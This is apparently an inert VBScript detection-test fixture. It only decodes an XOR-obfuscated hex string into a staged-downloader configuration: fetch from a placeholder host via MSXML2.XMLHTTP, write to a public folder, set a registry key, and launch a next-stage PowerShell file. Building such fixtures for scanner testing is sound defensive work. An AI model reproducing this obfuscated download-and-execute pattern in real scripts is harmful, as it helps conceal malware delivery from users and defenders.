Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_ef432cd6 = "c68d81ccc3c4d5c0c38dd1d3c1c5d9c2d5efc2d5dddfc4d59cc7c2d9c4d5efd6d9dcd59cd4d9c3c0d1c4d3d8efc0c2dfd3d5c3c39cd8d1ded4dfd6d6efc3d3c2d9c0c4ccd1d4d1c0c4d5c28dfde3e8fdfc829ee8fdfcf8e4e4e09e869e80ccc3c4d1d7d5efd3dfc5dec48d84ccd3d1ddc0d1d9d7deefd9d48dd3d1ddc0d1d9d7de9d818584d58488888689d5ccc5c2dc8dd8c4c4c0c38a9f9f818584d58488888689d59ed5c8d1ddc0dcd59ed9dec6d1dcd9d49f8687858684d4d3d69ed4d1c4ccc5c3d5c2efd1d7d5dec48df8c5dec4c2d5c3c3fcd1d29f818584d58488888689d5ccd6d9dcd5efc0d1c4d88df38aece5c3d5c2c3ece0c5d2dcd9d3ecf8c5dec4c2d5c3c3fcd1d2ecc3c4d1d7d59d818584d58488888689d59ed4d1c4ccc2d5d7d9c3c4c2c9efc0d1c4d88df8fbf3e5ece3dfd6c4c7d1c2d5ecf8c5dec4c2d5c3c3fcd1d2ecf4d9c3c0dfc3d1d2dcd5ec818584d58488888689d5ccded5c8c4efc3c4d1d7d58dc2d5c3dfc5c2d3d59dc3d1ddc0dcd59ec0c381"
Const Codec_ef432cd6 = "hex_compact|single_byte_xor|b0"

Function Load_ef432cd6()
  Dim result(), i
  ReDim result((Len(Material_ef432cd6) \ 2) - 1)
  For i = 0 To UBound(result)
    result(i) = CInt("&H" & Mid(Material_ef432cd6, i * 2 + 1, 2))
  Next
  Load_ef432cd6 = result
End Function

Function Decode_ef432cd6(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = s(i) Xor 176
  Next
  Decode_ef432cd6 = result
End Function

Function Recover_ef432cd6()
  Dim s, d, t, n, i, p, e, q
  n = LCase(UCase("Host"))

  s = Load_ef432cd6()

  Do

    d = Decode_ef432cd6(s)

    Exit Do

  Loop

  t = ""

  For i = 0 To UBound(d)

    t = t & Chr(d(i))

  Next
  Recover_ef432cd6 = t
End Function

Function Inspect_ef432cd6()
  Inspect_ef432cd6 = Recover_ef432cd6()
End Function
